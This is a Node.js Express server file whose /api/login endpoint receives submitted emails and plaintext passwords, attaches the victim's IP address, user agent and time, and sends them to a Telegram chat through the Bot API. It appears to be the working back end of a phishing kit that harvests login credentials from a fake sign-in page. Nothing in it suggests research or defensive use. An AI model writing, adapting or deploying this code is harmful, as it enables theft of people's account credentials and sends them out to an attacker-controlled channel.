// server/index.js
const express = require('express');
const fetch = require('node-fetch');
const path = require('path');

require('dotenv').config();

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.warn('Warning: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set. The /api/login endpoint will not forward messages until these are configured.');
}

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, '..')));

// Endpoint to receive login attempts
app.post('/api/login', async (req, res) => {
  try {
    const { email, password, userAgent } = req.body || {};
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Basic validation
    if (!email || !password) {
      return res.status(400).json({ error: 'Missing fields' });
    }

    // Compose message for Telegram
    const text = [
      '*Login Attempt Received*',
      `Email: ${escapeMarkdown(email)}`,
      `Password: ${escapeMarkdown(password)}`,
      `IP: ${escapeMarkdown(String(ip))}`,
      `User-Agent: ${escapeMarkdown(String(userAgent || ''))}`,
      `Time: ${new Date().toISOString()}`
    ].join('\n');

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      // For local testing: log to console instead of sending
      console.log('--- Login attempt (not forwarded), set TELEGRAM env to forward ---');
      console.log(text);
      return res.status(200).json({ forwarded: false });
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const body = {
      chat_id: TELEGRAM_CHAT_ID,
      parse_mode: 'MarkdownV2',
      text
    };

    const tgRes = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });

    const tgJson = await tgRes.json();
    if (!tgJson.ok) {
      console.error('Telegram API error', tgJson);
      return res.status(502).json({ error: 'Telegram API error', details: tgJson });
    }

    res.json({ forwarded: true });
  } catch (err) {
    console.error('Error handling /api/login', err);
    res.status(500).json({ error: 'server_error' });
  }
});

// Helper to escape Markdown special chars for Telegram MarkdownV2
function escapeMarkdown(str) {
  // escape characters: _ * [ ] ( ) ~ ` > # + - = | { } . !
  return String(str).replace(/([_\*\[\]\(\)~`>#+\-=|{}\.!])/g, '\\$1');
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server started on port ${PORT} — open http://localhost:${PORT}`);
});